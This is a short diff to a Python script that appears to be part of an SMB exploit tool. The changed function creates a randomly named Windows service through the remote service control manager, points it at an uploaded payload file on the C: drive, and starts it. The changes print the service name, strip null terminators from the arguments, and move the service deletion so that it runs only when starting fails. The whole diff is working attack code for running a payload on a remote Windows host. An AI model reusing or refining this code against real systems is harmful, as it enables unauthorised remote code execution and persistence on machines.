@@ -1140,6 +1140,7 @@ def do_system_mysmb_session(conn, pipe_name, share, mode, payload_file):
         serverThread.daemon = True
         serverThread.start()
     service_name = "".join([random.choice(string.ascii_letters) for _ in range(4)])
+    print(f"[*] service name: {service_name}")
     # shell = RemoteShell(share, conn, mode, service_name)
     # shell.cmdloop()
 
@@ -1176,9 +1177,9 @@ def do_system_mysmb_session(conn, pipe_name, share, mode, payload_file):
     res = scmr_.hRCreateServiceW(
         scmr,
         scHandle,
-        service_name + "\x00",
-        service_name + "\x00",
-        lpBinaryPathName=f"C:\\{payload_file}\x00",
+        service_name,
+        service_name,
+        lpBinaryPathName=f"C:\\{payload_file}",
         dwStartType=scmr_.SERVICE_DEMAND_START,
     )
     service = res["lpServiceHandle"]
@@ -1188,9 +1189,9 @@ def do_system_mysmb_session(conn, pipe_name, share, mode, payload_file):
         scmr_.hRStartServiceW(scmr, service)
     except Exception as e:
         print("[-] Failed to start service: %s" % str(e))
-    scmr_.hRDeleteService(scmr, service)
-    scmr_.hRCloseServiceHandle(scmr, service)
-    scmr_.hRCloseServiceHandle(scmr, scHandle)
+        scmr_.hRDeleteService(scmr, service)
+        scmr_.hRCloseServiceHandle(scmr, service)
+        scmr_.hRCloseServiceHandle(scmr, scHandle)
     print('done.')
 
     # example of executing a file on the remote host
